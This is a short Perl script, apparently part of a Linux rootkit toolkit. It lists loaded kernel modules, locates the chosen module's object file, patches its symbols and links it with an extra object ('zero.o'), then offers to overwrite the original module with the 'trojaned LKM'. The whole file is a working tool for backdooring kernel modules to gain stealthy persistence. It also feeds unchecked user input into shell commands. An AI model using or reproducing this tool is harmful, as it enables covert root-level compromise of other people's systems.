#!/usr/bin/perl

$| = 1;
open(I, "</proc/modules") || die $!;

print "The following LKMs are available:\n\n";
$i = 0;
while ($_ = <I>) {
	if (($i++ % 5) == 0) {
		print "\n";
	}
	/(\w+) /;
	$module = $1;
	print "$module ";
}

print "\n\nChose one: ";
$lkm = <STDIN>;
$lkm =~ s/\n//;
print "Choice was >>>$lkm<<<\n";
print "Searching for $lkm.o ...\n";

$u = `uname -r`;
$u =~ s/\n//;
$lkm_path = `find /lib/modules/$u -name $lkm.o`;
$lkm_path =~ s/\n//;
if ($lkm_path eq "") {
	print "No LKM with that name found!\n";
	exit;
}

print "Found $lkm_path!\n";

system("cp $lkm_path t.o");
system("./symsed t.o zero;ld -r t.o zero.o -o z.o; rm -f t.o");
print "\nCopy trojaned LKM back to original LKM? (y/n)\n";

while ($yn !~ /^(y|n)$/i) {
	$yn = <STDIN>;
	$yn =~ s/\n//;
}

if ($yn =~ /y/i) {
	system("cp z.o $lkm_path");
}

